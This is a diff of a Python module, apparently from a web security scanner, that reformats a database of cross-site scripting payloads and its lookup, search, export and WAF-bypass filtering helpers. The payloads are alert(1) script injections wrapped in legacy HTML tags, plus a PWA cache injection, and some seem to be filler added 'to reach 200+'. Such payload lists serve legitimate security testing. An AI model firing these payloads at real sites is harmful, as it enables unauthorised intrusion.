     "modern_pwa_cache": PayloadEntry(
         payload='{"url": "/app.js", "content": "<script>alert(1)</script>"}',
         contexts=["service_worker_xss"],
@@ -2892,9 +2647,8 @@ PAYLOAD_DATABASE = {
         description="PWA cache injection",
         tags=["pwa", "cache", "offline"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More comprehensive payloads
     "comprehensive_16": PayloadEntry(
         payload="<listing><script>alert(1)</script></listing>",
@@ -2904,9 +2658,8 @@ PAYLOAD_DATABASE = {
         description="Listing element XSS",
         tags=["listing", "legacy", "preformatted"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "comprehensive_17": PayloadEntry(
         payload="<noframes><script>alert(1)</script></noframes>",
         contexts=["html_content"],
@@ -2915,9 +2668,8 @@ PAYLOAD_DATABASE = {
         description="Noframes element XSS",
         tags=["noframes", "legacy", "frames"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "comprehensive_18": PayloadEntry(
         payload="<noembed><script>alert(1)</script></noembed>",
         contexts=["html_content"],
@@ -2926,9 +2678,8 @@ PAYLOAD_DATABASE = {
         description="Noembed element XSS",
         tags=["noembed", "legacy", "embed"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "comprehensive_19": PayloadEntry(
         payload="<blink><script>alert(1)</script></blink>",
         contexts=["html_content"],
@@ -2937,9 +2688,8 @@ PAYLOAD_DATABASE = {
         description="Blink element XSS",
         tags=["blink", "legacy", "deprecated"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     "comprehensive_20": PayloadEntry(
         payload="<multicol><script>alert(1)</script></multicol>",
         contexts=["html_content"],
@@ -2948,9 +2698,8 @@ PAYLOAD_DATABASE = {
         description="Multicol element XSS",
         tags=["multicol", "legacy", "columns"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     # Additional payloads to reach 200+
     "final_1": PayloadEntry(
         payload="<spacer><script>alert(1)</script></spacer>",
@@ -2960,9 +2709,8 @@ PAYLOAD_DATABASE = {
         description="Spacer element XSS",
         tags=["spacer", "legacy", "layout"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "final_2": PayloadEntry(
         payload="<layer><script>alert(1)</script></layer>",
         contexts=["html_content"],
@@ -2971,9 +2719,8 @@ PAYLOAD_DATABASE = {
         description="Layer element XSS",
         tags=["layer", "legacy", "positioning"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "final_3": PayloadEntry(
         payload="<ilayer><script>alert(1)</script></ilayer>",
         contexts=["html_content"],
@@ -2982,8 +2729,8 @@ PAYLOAD_DATABASE = {
         description="Inline layer element XSS",
         tags=["ilayer", "legacy", "inline"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
-    )
+        reliability="certain",
+    ),
 }
 
 # Database metadata
@@ -2993,37 +2740,31 @@ CONTEXTS_COVERED = set()
 for payload in PAYLOAD_DATABASE.values():
     CONTEXTS_COVERED.update(payload.contexts)
 
+
 def get_payload_by_id(payload_id: str) -> Optional[PayloadEntry]:
     """Get payload by ID"""
     return PAYLOAD_DATABASE.get(payload_id)
 
+
 def get_payloads_by_context(context: str) -> List[PayloadEntry]:
     """Get all payloads effective in a specific context"""
-    return [
-        payload for payload in PAYLOAD_DATABASE.values()
-        if context in payload.contexts
-    ]
+    return [payload for payload in PAYLOAD_DATABASE.values() if context in payload.contexts]
+
 
 def get_payloads_by_severity(severity: str) -> List[PayloadEntry]:
     """Get all payloads by severity level"""
-    return [
-        payload for payload in PAYLOAD_DATABASE.values()
-        if payload.severity == severity
-    ]
+    return [payload for payload in PAYLOAD_DATABASE.values() if payload.severity == severity]
+
 
 def get_payloads_by_tag(tag: str) -> List[PayloadEntry]:
     """Get all payloads by tag"""
-    return [
-        payload for payload in PAYLOAD_DATABASE.values()
-        if tag in payload.tags
-    ]
+    return [payload for payload in PAYLOAD_DATABASE.values() if tag in payload.tags]
+
 
 def get_waf_bypass_payloads() -> List[PayloadEntry]:
     """Get payloads designed for WAF bypass"""
-    return [
-        payload for payload in PAYLOAD_DATABASE.values()
-        if payload.waf_evasion
-    ]
+    return [payload for payload in PAYLOAD_DATABASE.values() if payload.waf_evasion]
+
 
 def get_database_info() -> Dict[str, Any]:
     """Get payload database information"""
@@ -3034,8 +2775,11 @@ def get_database_info() -> Dict[str, Any]:
         "severities": list(set(p.severity for p in PAYLOAD_DATABASE.values())),
         "waf_bypass_count": len(get_waf_bypass_payloads()),
         "tags": list(set(tag for p in PAYLOAD_DATABASE.values() for tag in p.tags)),
-        "browser_support": list(set(browser for p in PAYLOAD_DATABASE.values() for browser in p.browser_support))
+        "browser_support": list(
+            set(browser for p in PAYLOAD_DATABASE.values() for browser in p.browser_support)
+        ),
     }
+
 
 def search_payloads(query: str) -> List[Tuple[PayloadEntry, float]]:
     """Search payloads by query with relevance scoring"""
@@ -3068,6 +2812,7 @@ def search_payloads(query: str) -> List[Tuple[PayloadEntry, float]]:
     results.sort(key=lambda x: x[1], reverse=True)
     return results
 
+
 def test_payload_effectiveness(payload_id: str, test_context: str) -> Dict[str, Any]:
     """Test payload effectiveness in a specific context"""
     payload = get_payload_by_id(payload_id)
@@ -3086,12 +2831,14 @@ def test_payload_effectiveness(payload_id: str, test_context: str) -> Dict[str, 
         "severity": payload.severity,
         "cvss_score": payload.cvss_score,
         "tags": payload.tags,
-        "waf_evasion": payload.waf_evasion
+        "waf_evasion": payload.waf_evasion,
     }
+
 
 def get_all_payloads() -> Dict[str, PayloadEntry]:
     """Get all payloads in database"""
     return PAYLOAD_DATABASE.copy()
+
 
 def add_payload(payload_entry: PayloadEntry) -> bool:
     """Add new payload to database"""
@@ -3099,45 +2846,55 @@ def add_payload(payload_entry: PayloadEntry) -> bool:
         return False  # Duplicate payload
 
     # Generate ID from payload (simplified)
-    payload_id = payload_entry.payload.replace("<", "").replace(">", "").replace("\"", "").replace("'", "")[:50]
+    payload_id = (
+        payload_entry.payload.replace("<", "")
+        .replace(">", "")
+        .replace('"', "")
+        .replace("'", "")[:50]
+    )
     payload_id = payload_id.replace(" ", "_").replace("(", "").replace(")", "").replace(";", "")
 
     PAYLOAD_DATABASE[payload_id] = payload_entry
     return True
 
+
 def export_payloads(format: str = "json") -> str:
     """Export payloads in specified format"""
     if format == "json":
-        return json.dumps({
-            payload_id: {
-                "payload": payload.payload,
-                "contexts": payload.contexts,
-                "severity": payload.severity,
-                "cvss_score": payload.cvss_score,
-                "description": payload.description,
-                "tags": payload.tags
-            }
-            for payload_id, payload in PAYLOAD_DATABASE.items()
-        }, indent=2)
+        return json.dumps(
+            {
+                payload_id: {
+                    "payload": payload.payload,
+                    "contexts": payload.contexts,
+                    "severity": payload.severity,
+                    "cvss_score": payload.cvss_score,
+                    "description": payload.description,
+                    "tags": payload.tags,
+                }
+                for payload_id, payload in PAYLOAD_DATABASE.items()
+            },
+            indent=2,
+        )
 
     return "Unsupported format"
 
+
 # Export all functions and data
 __all__ = [
-    'PayloadEntry',
-    'PAYLOAD_DATABASE',
-    'get_payload_by_id',
-    'get_payloads_by_context',
-    'get_payloads_by_severity',
-    'get_payloads_by_tag',
-    'get_waf_bypass_payloads',
-    'get_database_info',
-    'search_payloads',
-    'test_payload_effectiveness',
-    'get_all_payloads',
-    'add_payload',
-    'export_payloads',
-    'PAYLOAD_DB_VERSION',
-    'TOTAL_PAYLOADS',
-    'CONTEXTS_COVERED'
+    "PayloadEntry",
+    "PAYLOAD_DATABASE",
+    "get_payload_by_id",
+    "get_payloads_by_context",
+    "get_payloads_by_severity",
+    "get_payloads_by_tag",
+    "get_waf_bypass_payloads",
+    "get_database_info",
+    "search_payloads",
+    "test_payload_effectiveness",
+    "get_all_payloads",
+    "add_payload",
+    "export_payloads",
+    "PAYLOAD_DB_VERSION",
+    "TOTAL_PAYLOADS",
+    "CONTEXTS_COVERED",
 ]
